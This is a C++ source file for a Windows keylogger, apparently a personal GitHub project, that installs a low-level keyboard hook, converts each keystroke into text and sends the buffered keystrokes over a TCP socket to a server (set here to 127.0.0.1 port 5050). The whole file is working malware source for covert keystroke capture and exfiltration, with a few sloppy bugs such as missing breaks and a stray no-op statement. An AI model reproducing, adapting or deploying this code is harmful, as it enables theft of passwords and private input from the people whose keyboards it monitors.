/*

author : Yekuuun
github : https://github.com/yekuuun

contains all code related to sockets management

*/
#include <iostream>
#include <winSock2.h>
#include <ws2tcpip.h>
#include <synchapi.h>

void display_informations(const char* message){
    std::cout << message << std::endl;
}

//prototype
int lauch_keylogger();

//global data
SOCKET socket_peer;
char data[20];
int size_data = 0;

//creating TCP socket
int launch_socket(){
    int getnameinfo_result = 0;

    std::cout << "Launching client..." << std::endl;

    //initialize socket library
    WSADATA ws;

    int ws_result = WSAStartup(MAKEWORD(2,2), &ws);

    if(ws_result != 0){
        std::cout << "[ERROR] while trying to initialize socket library..." << std::endl;
        return EXIT_FAILURE;
    }

    //ptr to addrinfo
    struct addrinfo *result = NULL;

    //configuring remote address
    struct addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET; // IPv4
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    int getaddrinfo_result = getaddrinfo("127.0.0.1","5050", &hints, &result);

    if(getaddrinfo_result != 0){
        std::cout << "[ERROR] unable to use getaddrinfo() with error : " <<  WSAGetLastError() << std::endl;
        goto CLEANUP;
    }

    char address_buffer[100];
    char service_buffer[100];

    getnameinfo_result = getnameinfo(result->ai_addr, result->ai_addrlen, address_buffer, sizeof(address_buffer), service_buffer, sizeof(service_buffer),NI_NUMERICHOST);

    if(getnameinfo_result != 0){
        std::cout << "[ERROR] while trying to get remote address informations with error code : " << WSAGetLastError() << std::endl;
        goto CLEANUP;
    }
    std::cout << "remote address is: " << address_buffer << " with port: " << service_buffer << std::endl;

    //creating socket
    socket_peer = socket(result->ai_family, result->ai_socktype, result->ai_protocol);

    if(socket_peer == INVALID_SOCKET){
        std::cout << "[ERROR] unable to create socket with error : " << WSAGetLastError() << std::endl;
        goto CLEANUP;
    }

    //trying to connect to the server
    while(1){

        display_informations("Connecting to the server...");

        int connection_try = connect(socket_peer, result->ai_addr, result->ai_addrlen);

        if(connection_try == 0){
            display_informations("Connection etablished ! \n");
            break;
        }

        display_informations("Unable to etablish connexion...\n\n");

        //chose a delay to retry connection
        Sleep(5);
    }

    //connection etablished
    while(1){
        lauch_keylogger();
    }
 
    CLEANUP:
        freeaddrinfo(result);

        if(socket_peer){
            closesocket(socket_peer);
            std::cout << "closing socket..." << std::endl;
        }

        WSACleanup();
        std::cout << "Finished." << std::endl;
        return EXIT_FAILURE;
    
    return EXIT_SUCCESS;
}

//sending data to server
void send_data(){
    std::cout << "just sent: " << data << std::endl;

    // Send data
    if (send(socket_peer, data, strlen(data), 0) == SOCKET_ERROR) {
        closesocket(socket_peer);
        WSACleanup();
        exit(EXIT_FAILURE);
    }

    memset(data, 0, sizeof(data));
    size_data = 0;
}

//adding keylogs
void add_char(const char *str){
    std::cout << "logs: " << str << std::endl;

    int str_length = strlen(str);
    
    for (int i = 0; i < str_length && size_data < sizeof(data) - 1; i++) {
        if (size_data == 20) {
            send_data();
        }

        data[size_data++] = str[i];
    }

    // Vérifie si le tableau est plein après l'ajout des caractères
    if (size_data == sizeof(data) - 1) {
        send_data();
    }
}

//callback function
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;

	switch (wParam)
	{
	case WM_KEYDOWN:
		{
			DWORD vkCode = pKeyBoard->vkCode;
			if (GetAsyncKeyState(VK_SHIFT))
			{
				switch (vkCode)
				{
				case 0x30:
					add_char( "[)]");
					break;
				case 0x31:
					add_char( "[!]");
					break;
				case 0x32:
					add_char( "[@]");
					break;
				case 0x33:
					add_char( "[#]");
					break;
				case 0x34:
					add_char( "[$]");
					break;
				case 0x35:
					add_char( "[%]");
					break;
				case 0x36:
					add_char("[^]");
					break;
				case 0x37:
					add_char("[&]");
					break;
				case 0x38:
					add_char("[*]");
					break;
				case 0x39:
					add_char("[(]");
					break;
				case 0xBF:
					add_char("[?]"); ///
					break;
				case 0xBB:
					add_char("[+]");
					break; 
				case 0xBE:
					add_char("[<]");
					break; 
				case 0xBD:
					add_char("[_]");
					break;
				case 0xE2:
					add_char("[>]");
					break;
				case 0x1C:
					add_char("[VK_CONVERT]");
					break;
				case 0x56:
					add_char("[@]");
					break;
				case  0x2A:
					add_char("[PRINT]");
					break;
				case  0x2E:
                    add_char("[Delete]");
					break;
				case 0xAA:
					add_char("[Search]");
					break;
				case  0xF2:
					add_char("[Copy]");
					break;
				case 0xFE:
					add_char("[Clear]");
					break;
				case  0x3:
					add_char("[Connect]");
					break;
				case 0x6:
					add_char("[Logoff]");
					break;
				}
			}
			else
			{
				switch (vkCode)
				{
				case 0x30:
					add_char("0");
					break;
				case 0x31:
					add_char("1");
					break;
				case 0x32:
					add_char("2");
					break;
				case 0x33:
					add_char("3");
					break;
				case 0x34:
					add_char("4");
					break;
				case 0x35:
					add_char("5");
					break;
				case 0x36:
					add_char("6");
					break;
				case 0x37:
					add_char("7");
					break;
				case 0x38:
					add_char("8");
					break;
				case 0x39:
					add_char("9");
					break;
				case 0xBF:
					add_char("/");
					break;
				case 0xBB:
					add_char("=");
					break;
				case 0xBC:
					add_char(",");
					break;
				case 0xBE:
					add_char(".");
					break;
				case 0xBD:
					add_char("-");
					break;
				case 0xE2:
					add_char("<");
					break;
				}
			}
			if (!(GetAsyncKeyState(VK_SHIFT)))

			{
				switch (vkCode)
				{
				case 0x41:
					add_char("a");
					break;
				case 0x42:
					add_char("b");
					break;
				case 0x43:
					add_char("c");
					break;
				case 0xBA:
					add_char("č");
					break;
				case 0x44:
					add_char("d");
					break;
				case 0x45:
					add_char("e");
					break;
				case 0x46:
					add_char("f");
					break;
				case 0x47:
					add_char("g");
					break;
				case 0x48:
					add_char("h");
					break;
				case 0x49:
					add_char("i");
					break;
				case 0x4A:
					add_char("j");
					break;
				case 0x4B:
					add_char("k");
					break;
				case 0x4C:
					add_char("l");
					break;
				case 0x4D:
					add_char("m");
					break;
				case 0x4E:
					add_char("n");
					break;
				case 0x4F:
					add_char("o");
					break;
				case 0x50:
					add_char("p");
					break;
				case 0x52:
					add_char("r");
					break;
				case 0x53:
					add_char("s");
					break;
				case 0x54:
					add_char("t");
					break;
				case 0x55:
					add_char("u");
					break;
				case 0x56:
					add_char("v");
					break;
				case 0x5A:
					add_char("z");
					break;
				case 0xDC:
					add_char("\\");
					break;
				case 0x51:
					add_char("q");
					break;
				case 0x57:
					add_char("w");
					break;
				case 0x59:
					add_char("y");
					break;
				case 0x58:
					add_char("x");
					break;
				case 0xDE:
					add_char("ć");
					break;
				case 0xDD:
					add_char("đ");
					break;
				default:
					add_char(" ");
				}
			}

			if ((GetAsyncKeyState(VK_SHIFT)))

			{
				switch (vkCode)
				{
				case 0x41:
					add_char("A");
					break;
				case 0x42:
					add_char("B");
					break;
				case 0x43:
					add_char("C");
					break;
				case 0xBA:
					add_char("č");
					break;
				case 0x44:
					add_char("D");
					break;
				case 0x45:
					add_char("E");
					break;
				case 0x46:
					add_char("F");
					break;
				case 0x47:
					add_char("G");
					break;
				case 0x48:
					add_char("H");
					break;
				case 0x49:
					add_char("I");
					break;
				case 0x4A:
					add_char("J");
					break;
				case 0x4B:
					add_char("K");
					break;
				case 0x4C:
					add_char("L");
					break;
				case 0x4D:
					add_char("M");
					break;
				case 0x4E:
					add_char("N");
					break;
				case 0x4F:
					add_char("O");
					break;
				case 0x50:
					add_char("P");
					break;
				case 0x52:
					add_char("R");
					break;
				case 0x53:
					add_char("S");
					break;
				case 0x54:
					add_char("T");
					break;
				case 0x55:
					add_char("U");
					break;
				case 0x56:
					add_char("V");
					break;
				case 0x5A:
					add_char("Z");
					break;
				case 0x51:
					add_char("Q");
					break;
				case 0x57:
					add_char("W");
					break;
				case 0x59:
					add_char("Y");
					break;
				case 0x58:
					add_char("X");
					break;
				default:
					add_char(" ");
				}
			}


			else VK_SHIFT  + KF_ALTDOWN ;

			switch (vkCode)
			{
			case VK_SPACE:
				add_char("[Space]");
				break;
			case 0x2E:
				add_char("[Delete]");
				break;
			case VK_BACK:
				add_char("[BackSpace]");
				break;
			case VK_RETURN:
				add_char("[Enter]\n");
				break;
			case VK_LCONTROL:
				add_char("[Ctrl]");
				break;
			case VK_RCONTROL:
				add_char("[Ctrl]");
				break;
			case VK_TAB:
				add_char("[Tab]");
				break;
			case 0x25:
				add_char("[Left Arrow]");
				break;
			case 0x26:
				add_char("[Up Arrow]");
				break;
			case 0x27:
				add_char("[Right Arrow]");
				break;
			case 0x28:
				add_char("[Down Arrow]");
				break;
			case VK_ESCAPE:
				add_char("[Esc]");
				break;
			case VK_CAPITAL:
				add_char("[Caps Lock]");
				break;
			case VK_RSHIFT:
				add_char("[Right Shift]");
				break;
			case VK_LSHIFT:
				add_char("[Left Shift]");
				break;
			case VK_LMENU:
				add_char("[Left Alt]");
				break;
			case VK_RMENU:
				add_char("[Right Alt]");
				break;
			case VK_LWIN:
				add_char("[Left Win]");
				break;
			case VK_RWIN:
				add_char("[Right Win]");
				break;
			case VK_INSERT:
				add_char("[Insert]");
				break;
			case VK_SCROLL:
				add_char("[Scroll Lock]");
				break;
			case VK_HOME:
				add_char("[Home]");
				break;
			case VK_END:
				add_char("[End]");
				break;
			case VK_PRIOR:
				add_char("[Page Up]");
				break;
			case VK_NEXT:
				add_char("[Page Down]");
				break;
			case VK_SNAPSHOT:
				add_char("[Print Screen]");
				break;
			case VK_OEM_3:
				add_char("[ ~ ` ]");
				break;
			case VK_OEM_4:
				add_char("[ { [ ]");
				break;
			case VK_OEM_6:
				add_char("[ } ] ]");
				break;
			case VK_OEM_1:
				add_char("[ : ; ]");
				break;
			case VK_OEM_7:
				add_char("[ \" ' ]");
				break;
			case VK_F1:
				add_char("[F1]");
				break;
			case VK_F2:
				add_char("[F2]");
				break;
			case VK_F3:
				add_char("[F3]");
				break;
			case VK_F4:
				add_char("[F4]");
				break;
			case VK_F5:
				add_char("[F5]");
				break;
			case VK_F6:
				add_char("[F6]");
				break;
			case VK_F7:
				add_char("[F7]");
				break;
			case VK_F8:
				add_char("[F8]");
				break;
			case VK_F9:
				add_char("[F9]");
				break;
			case VK_F10:
				add_char("[F10]");
				break;
			case VK_F11:
				add_char("[F11]");
				break;
			case VK_F12:
				add_char("[F12]");
				break;
			case VK_NUMPAD0:
				add_char("0");
				break;
			case VK_NUMPAD1:
				add_char("1");
				break;
			case VK_NUMPAD2:
				add_char("2");
				break;
			case VK_NUMPAD3:
				add_char("3");
				break;
			case VK_NUMPAD4:
				add_char("4");
				break;
			case VK_NUMPAD5:
				add_char("5");
				break;
			case VK_NUMPAD6:
				add_char("6");
				break;
			case VK_NUMPAD7:
				add_char("7");
				break;
			case VK_NUMPAD8:
				add_char("8");
				break;
			case VK_NUMPAD9:
				add_char("9");
				break;
			case 0x6F:
				add_char("[/]");
				break;
			case 0x6A:
				add_char("[*]");
				break;
			case 0x6D:
				add_char("[-]");
				break;
			case 0x6B:
				add_char("[+]");
				break;
			case 0x6E:
				add_char("[,]");
				break;
			}
		}
	case WM_SYSKEYDOWN:
		{
			DWORD vkCode = pKeyBoard->vkCode;
			if (GetAsyncKeyState(VK_RSHIFT))
			{
				switch (vkCode)
				{
				case 0x51:
					add_char("[\\]");
					break;
				case 0x57:
					add_char("[|]");
					break;
				case 0xDB:
					add_char("[{]");
					break;
				case 0xDD:
					add_char("[}]");
					break;
				case 0xDC:
					add_char("[|]");
					break;
				case 0x56:
					add_char("[@]");
					break; 
				case 0xBE:
					add_char("[>]");
					break;
				}
			}
		}
	default:
		return CallNextHookEx( NULL, nCode, wParam, lParam );
	}

	return 0;
}

DWORD WINAPI Keylogger(){
    HHOOK hKeyHook;
	HINSTANCE hExe = GetModuleHandle(NULL);
	if (hExe == NULL)
	{
		return 1;
	}
	else
	{
		hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hExe, 0);
		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0) != 0)
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		UnhookWindowsHookEx(hKeyHook);
	}
	return 0;
}

int lauch_keylogger(){
	HANDLE hThread;
	DWORD dwThread;
	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Keylogger,NULL, 0, NULL);
	if (hThread)
	{
		return WaitForSingleObject(hThread, INFINITE);
	}
	else
	{
		return 1;
	}
}

int main(){
    launch_socket();
}